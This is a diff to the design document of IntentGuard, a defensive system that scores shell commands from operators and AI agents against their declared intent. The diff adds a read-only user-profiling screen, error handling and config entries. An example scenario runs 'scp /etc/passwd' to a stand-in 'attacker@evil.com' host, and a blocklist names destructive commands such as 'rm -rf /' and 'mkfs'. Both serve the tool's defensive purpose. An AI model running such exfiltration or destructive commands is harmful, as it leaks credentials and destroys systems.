@@ -23,9 +23,10 @@
 14. [Explainability & Data Sovereignty](#14-explainability)
 15. [Snapshot / Undo](#15-snapshot)
 16. [Demo Scenario Replay](#16-scenario-replay)
-17. [End-to-End Flow: One Command Through Everything](#17-end-to-end)
-18. [API Reference](#18-api-reference)
-19. [Configuration Reference](#19-config-reference)
+17. [User Profiling Screen (read-only forensic view)](#17-user-profiling)
+18. [End-to-End Flow: One Command Through Everything](#18-end-to-end)
+19. [API Reference](#19-api-reference)
+20. [Configuration Reference](#20-config-reference)
 
 ---
 
@@ -41,7 +42,8 @@ It catches three attack types:
 - **Session hijack** — someone else takes over a terminal session
 
 The design target is a **2-second decision budget**. The current `decision.budget-ms` is
-set to `60000` ms to accommodate Ollama/BT LLM server latency in the demo environment; the
+set to `20000` ms to accommodate Ollama/BT LLM server latency in the demo environment (it covers
+up to two scoring-path LLM calls at `ollama.scoring-timeout-ms` each plus overhead); the
 architectural constraint still holds and tightens once sub-second inference is available.
 
 ### LLM Backends
@@ -58,6 +60,10 @@ Translation defaults to the Ollama backend.
 
 ### System Context Diagram
 
+Two clearly separated flows share one data store. The **enforcement flow** (solid) intercepts,
+scores, decides, persists, and pushes live. The **read-only profiling flow** (dashed) never touches
+enforcement — it only projects already-persisted collections back to the operator.
+
 ```mermaid
 graph LR
     subgraph Operators
@@ -65,20 +71,27 @@ graph LR
         A[AI Agent]
     end
 
-    subgraph IntentGuard
+    subgraph "IntentGuard — Enforcement (write path)"
         SH[Shell_Hook<br/>Unix Socket]
         SE[Scoring Engine]
         DE[Decision Engine]
-        CT[Control Tower<br/>SSE]
-        DB[(MongoDB)]
+        CT[Control Tower<br/>Live tab · SSE]
     end
 
-    subgraph LLM Backends
+    subgraph "IntentGuard — Read-only analytics"
+        UP[User Profile API<br/>GET-only aggregation]
+        UPT[Control Tower<br/>User Profiling tab]
+    end
+
+    DB[(MongoDB<br/>audit · sessions · profiles<br/>assist · translations)]
+
+    subgraph "LLM Backends & Sources"
         OLL[Ollama / BT LLM<br/>Qwen2.5:14B — default]
         GEM[Google Gemini<br/>Speech only by default]
         AUD[auditd<br/>Kernel]
     end
 
+    %% Enforcement (write) path — solid
     H -->|command| SH
     A -->|command| SH
     SH --> SE
@@ -90,7 +103,20 @@ graph LR
     AUD -->|execve events| SE
     CT -->|SSE stream| H
     GEM -->|STT/TTS| CT
+
+    %% Read-only profiling path — dashed; reads only, never enforces
+    H -.->|search user · pick window| UPT
+    UPT -.->|GET /api/users · /profile| UP
+    UP -.->|pure reads: 6 blocks + riskStats| DB
+    UP -.->|UserProfileView| UPT
+
+    style UP fill:#1f2a3d,stroke:#4f8cff,color:#e6edf6
+    style UPT fill:#1f2a3d,stroke:#4f8cff,color:#e6edf6
 ```
+
+> The dashed profiling path is strictly observational: GET-only endpoints, pure repository reads,
+> and no link into the Scoring or Decision engines. A build-failing bean-wiring test enforces that
+> the aggregation service can only be handed repositories.
 
 ### Threat Model Overview
 
@@ -654,6 +680,25 @@ sequenceDiagram
     end
 ```
 
+### Error handling & degradation
+
+`AssistController` maps each failure mode to a distinct HTTP status via dedicated
+`@ExceptionHandler`s, so a cold or unavailable LLM never produces an unhandled 500:
+
+| Condition | Status | Body |
+|-----------|--------|------|
+| Rate limit exceeded | `429` | retry hint |
+| Validation / bad request | `400` | message |
+| Assist session not found | `404` | message |
+| Confirm on a BLOCK decision | `403` | message |
+| All alternatives blocklisted | `422` | message |
+| Translation upstream failure | `502` | message |
+| **LLM generation failure** (empty/timed-out model) | `502` | `error` = clean operator-facing "temporarily unavailable" message; `detail` = raw provider cause |
+
+The LLM-generation `502` deliberately returns a friendly `error` string with the raw provider
+cause preserved separately under `detail`, so a cold `Qwen2.5:14B` degrades to a clear
+"try again" rather than leaking a provider-internal string to the operator.
+
 ### Key files
 - `assist/AssistController.java`, `assist/DefaultNlAssistService.java`
 - `assist/GeminiCommandGenerator.java`, `assist/GenerationBlocklist.java`
@@ -1036,7 +1081,143 @@ and expected vs. actual comparisons.
 
 ---
 
-## 17. End-to-End Flow: One Command Through Everything {#17-end-to-end}
+## 17. User Profiling Screen (read-only forensic view) {#17-user-profiling}
+
+### Design
+
+A second Control_Tower tab that reconstructs a single operator's complete activity profile from
+data IntentGuard has **already persisted** — no new inference, no writes, no enforcement. An
+operator searches for a user, picks a time window, and sees six activity blocks assembled in
+parallel. It is strictly observational: a build-failing bean-wiring test guarantees the aggregation
+service can only ever be handed repositories, never a scoring/decision/translation/execution
+collaborator.
+
+The feature adds one backend service (`UserProfileService` / `DefaultUserProfileService`), one
+controller (`UserProfileController`, GET-only), a set of read-only repository projections, and a
+new frontend view sharing the live dashboard's card-grid design.
+
+### The two endpoints
+
+| Method | Path | Returns |
+|--------|------|---------|
+| `GET` | `/api/users` | `KnownUsersView` — distinct, case-insensitively deduped, sorted user list |
+| `GET` | `/api/users/{userId}/profile?days=&full=` | `UserProfileView` — six activity blocks + window metadata |
+
+`GET /api/users/{userId}/profile` accepts `days` (1–365, default 3) or `full=true` (earliest
+record → now). Non-integer / out-of-range `days` → **HTTP 400 `INVALID_WINDOW`**. Any non-GET verb
+on either path → **HTTP 405**. A blank `userId` → **HTTP 400 `MISSING_USER_ID`**.
+
+### The six activity blocks
+
+| Block | Source store | Projection | Ordering |
+|-------|-------------|-----------|----------|
+| **commandTimeline** | `audit_history` | `CommandDecisionEntry` (verdict, score, reason, profileState, inputOrigin) | oldest-first, deterministic ties |
+| **multilingual** | `intent_sessions` | `MultilingualEntryView` — non-English intents in **native script** + English translation | most-recent-first |
+| **assistQueries** | `assist_audit` (QUERY only) | `AssistQueryView` — English query + generated commands | oldest-first, ties by `_id` |
+| **translations** | `translation_records` | `TranslationRecordView`, correlated to the user's declared intents | oldest-first, stable key |
+| **behavioralProfile** | `behavioral_profiles` | `BehavioralProfileView` — state, event count, top-k vocabulary + sequence stats | desc count / asc key |
+| **riskStats** | `audit_history` (trailing 30d) | `RiskStats` — average command score + 30-day trend | daily series oldest-first |
+
+Every list block is a `CategoryView<T>` capped at **Record_Cap = 500** with a `truncated` flag and
+`totalAvailable` count. Each block is fetched on a bounded 5-thread pool with an **independent
+5-second cutoff**: a block that times out or throws becomes `UNAVAILABLE` without affecting its
+siblings. `profileLoadFailed` is set only when *every* block fails — distinct from an
+empty-but-successful profile so the UI never confuses "no activity" with "couldn't load".
+
+### Multilingual native-script display
+
+`MultilingualEntryView.from(session, langs)` returns an entry only when the session is
+attributable (non-blank `userId`), its `originalDeclaredIntent` is present, and its
+`declaredIntentLanguageTag` is a **non-English** Supported_Language. The `sourceText` is copied
+byte-for-byte, so the UI renders it in its own script (Devanagari, Tamil, Bengali, …) tagged by
+`sourceLanguageTag`, with the English `declaredIntent` shown beside it. Technical tokens (paths,
+IPs, commands) survive verbatim in both.
+
+### Risk statistics: average command score + 30-day trend
+
+`RiskStats` powers the "average command score" badge and the trend graph:
+
+- Reads the user's `audit_history` over a **fixed trailing 30-day window** (independent of the
+  display window).
+- Computes the mean divergence score, ALLOW/ASK/BLOCK counts, and a coarse **risk band**
+  (`LOW < 0.4`, `ELEVATED < 0.8`, `HIGH` — aligned with the default ask/block thresholds).
+- Emits a **continuous per-day series** (`DailyRiskPoint[]`) — one point per calendar day (UTC),
+  empty days included — so the graph draws a full 30-day axis with visible gaps.
+- Absent (no scored commands in the window) → `present=false` with an empty-but-continuous series,
+  so the UI shows an empty state rather than a misleading `0.00`.
+
+### Profile Assembly Flow
+
+```mermaid
+flowchart TD
+    REQ[GET /api/users/id/profile?days&full] --> CTRL[UserProfileController]
+    CTRL --> V{userId blank?}
+    V -->|YES| E400M[400 MISSING_USER_ID]
+    V -->|NO| RW[resolveWindow days/full]
+    RW -->|days out of 1..365| E400W[400 INVALID_WINDOW]
+    RW -->|ok| ASM[assemble userId, window, fullHistory]
+
+    ASM --> POOL[bounded 5-thread pool<br/>independent 5s cutoff each]
+    POOL --> C1[commandTimeline<br/>audit_history]
+    POOL --> C2[multilingual<br/>intent_sessions — native script]
+    POOL --> C3[assistQueries<br/>assist_audit QUERY]
+    POOL --> C4[translations<br/>translation_records — correlated]
+    POOL --> C5[behavioralProfile<br/>behavioral_profiles]
+    POOL --> C6[riskStats<br/>audit_history trailing 30d]
+
+    C1 & C2 & C3 & C4 & C5 & C6 --> AWAIT{each: success / timeout / throw}
+    AWAIT -->|timeout or throw| UNAVAIL[CategoryView.unavailable / absent]
+    AWAIT -->|success| OKV[CategoryView.of / present]
+    UNAVAIL & OKV --> ENV[UserProfileView envelope]
+    ENV --> PLF{all blocks failed?}
+    PLF -->|YES| FAIL[profileLoadFailed = true]
+    PLF -->|NO| PARTIAL[profileLoadFailed = false<br/>failed blocks marked UNAVAILABLE]
+    FAIL & PARTIAL --> RESP[200 UserProfileView]
+```
+
+### Frontend
+
+The profiling view (`static/index.html` `#profiling-view`) shares the live dashboard's responsive
+card grid. Controls sit on one aligned row: a **searchable user box** (a text input backed by a
+native `<datalist>` — type-to-filter, exact case-insensitive match enables Load), a days input, a
+Full-history toggle, and the resolved window bounds. A full-width **Risk Overview** header renders
+the average-score badge (colour-coded by band) and the 30-day bar graph (drawn on a canvas with
+0.4/0.8 threshold guide lines), followed by the five detail panels. Switching tabs never reloads
+the page and never closes the live SSE stream (`setView` only toggles visibility). Pure
+state/derivation and render functions are exported for the Node test suite.
+
+### Read-only guarantee (Req 9)
+
+```mermaid
+flowchart LR
+    subgraph "GET-only surface"
+        G1[GET /api/users] & G2[GET /api/users/id/profile]
+    end
+    W[POST / PUT / DELETE] -->|Spring MVC| M405[405 Method Not Allowed]
+    G1 & G2 --> SVC[DefaultUserProfileService]
+    SVC --> RO[repositories: pure reads only]
+    RO --> INV[store contents identical before and after — proven by property test P13]
+    SVC -.->|build-failing wiring test| NOENF[cannot inject scoring / decision / translation / execution]
+```
+
+### Key files
+- `api/UserProfileController.java` — GET-only `/api/users` + `/api/users/{userId}/profile`; 400/405 handlers
+- `api/UserProfileService.java` / `api/DefaultUserProfileService.java` — window resolution + parallel assembly + `computeRiskStats`
+- `api/UserProfileView.java` — envelope (six blocks + window metadata)
+- `api/CategoryView.java`, `api/CategoryStatus.java` — bounded, status-annotated category wrapper
+- `api/CommandDecisionEntry.java`, `api/MultilingualEntryView.java`, `api/AssistQueryView.java`,
+  `api/TranslationRecordView.java`, `api/BehavioralProfileView.java` (+ `CountEntry`)
+- `api/RiskStats.java`, `api/DailyRiskPoint.java` — average score + 30-day trend
+- `api/KnownUsersView.java`, `api/ActiveWindow.java`, `api/ProfileErrorResponse.java`,
+  `api/MissingUserIdException.java`, `api/InvalidWindowException.java`
+- read-only repo methods on `AuditHistoryRepository`, `IntentSessionRepository`,
+  `BehavioralProfileRepository`, `AssistAuditRepository`, `TranslationRecordRepository`
+- `static/index.html`, `static/app.js`, `static/styles.css` — profiling tab, searchable selector,
+  Risk Overview panel + trend graph
+
+---
+
+## 18. End-to-End Flow: One Command Through Everything {#18-end-to-end}
 
 **Scenario:** Operator "ravi" types `scp /etc/passwd attacker@evil.com:/tmp/`
 with active intent: "checking nginx config files"
@@ -1124,7 +1305,7 @@ flowchart TD
 
 ---
 
-## 18. API Reference {#18-api-reference}
+## 19. API Reference {#19-api-reference}
 
 | Method | Path | Controller | Purpose |
 |--------|------|------------|---------|
@@ -1142,6 +1323,8 @@ flowchart TD
 | `PUT` | `/api/preferences/language` | `TranslationController` | Set operator language |
 | `GET` | `/api/explain/{eventId}` | `InsightController` | Per-component explainability |
 | `GET` | `/api/sovereignty` | `InsightController` | Data-sovereignty posture |
+| `GET` | `/api/users` | `UserProfileController` | Known-user list (deduped, sorted) |
+| `GET` | `/api/users/{userId}/profile` | `UserProfileController` | Read-only per-user profile: six activity blocks + `riskStats` (`days`/`full` window) |
 | `POST` | `/api/assist` | `AssistController` | NL query → command alternatives |
 | `POST` | `/api/assist/select` | `AssistController` | Score selected command |
 | `POST` | `/api/assist/confirm` | `AssistController` | Execute confirmed command |
@@ -1149,9 +1332,11 @@ flowchart TD
 
 > `AssistController` endpoints require `X-Operator-Id` header.
 
+> `UserProfileController` endpoints are strictly read-only (GET-only): any non-GET verb returns HTTP 405, and the aggregation service performs no writes and never invokes the scoring, decision, translation, or execution paths.
+
 ---
 
-## 19. Configuration Reference {#19-config-reference}
+## 20. Configuration Reference {#20-config-reference}
 
 All under `intentguard.*` in `src/main/resources/application.yml`:
 
@@ -1167,22 +1352,30 @@ All under `intentguard.*` in `src/main/resources/application.yml`:
 | `ollama.base-url` | Ollama server | `https://asksredigital.bt.com/sre-llm-service-dev` |
 | `ollama.model` | Ollama model | `Qwen2.5:14B` |
 | `ollama.translation-model` | Translation model | `Qwen2.5:14B` |
-| `ollama.timeout-ms` | Ollama timeout | `60000` |
+| `ollama.timeout-ms` | Ollama timeout (non-blocking: translation, NL generation) | `60000` |
+| `ollama.scoring-timeout-ms` | Ollama timeout on the synchronous shell-hook scoring path (tight, so a slow LLM excludes Semantic and the 3 deterministic components still score) | `8000` |
 | `translation.provider` | Translation backend | `ollama` |
-| `translation.timeout-ms` | Translation timeout | `60000` |
+| `translation.timeout-ms` | Translation timeout | `180000` |
+| `translation.sensitive-content-translatable` | Allow translating content flagged sensitive by the gate | `false` |
 | `speech.provider` | Speech (always Gemini) | `gemini` |
 | `speech.stt-timeout-ms` | STT timeout | `10000` |
 | `speech.tts-timeout-ms` | TTS timeout | `5000` |
-| `decision.budget-ms` | Decision budget | `60000` (design target: 2000) |
+| `decision.budget-ms` | Decision budget | `20000` (design target: 2000) |
 | `decision.monitoring-gap-timeout-ms` | Watchdog threshold | `5000` |
+| `decision.correlation-window-ms` | Hook↔audit correlation window | `1000` |
 | `decision.confirmation-timeout-ms` | ASK confirmation window | `15000` |
 | `decision.learning-min-events` | Profile learning threshold | `200` |
 | `assist.session-timeout-ms` | Assist idle timeout | `300000` |
 | `assist.rate-limit-per-minute` | Assist rate limit | `10` |
 | `assist.execution-timeout-ms` | Command exec timeout | `30000` |
+| `assist.blocklist` | Regex patterns refused at generation time | `rm -rf /`, `mkfs`, `rmmod`, `modprobe -r` |
 | `snapshot.enabled` | Snapshot/undo | `false` |
 | `inferred-intent.enabled` | Inferred intent stretch | `false` |
 | `guardrails.semantic.enabled` | Prompt-injection + drift | off |
 | `guardrails.velocity.enabled` | Velocity guardrail | off |
 | `guardrails.time-context.enabled` | Time-context guardrail | off |
 | `guardrails.fail-closed.enabled` | Fail-closed dependency guard | `true` (default) |
+
+> `socket.path` defaults to `/var/run/intentguard/intentguard.sock`, but `run.sh` (and the
+> demo runbook) override it to the user-writable `/tmp/intentguard/intentguard.sock` so no
+> sudo is needed on a dev machine.
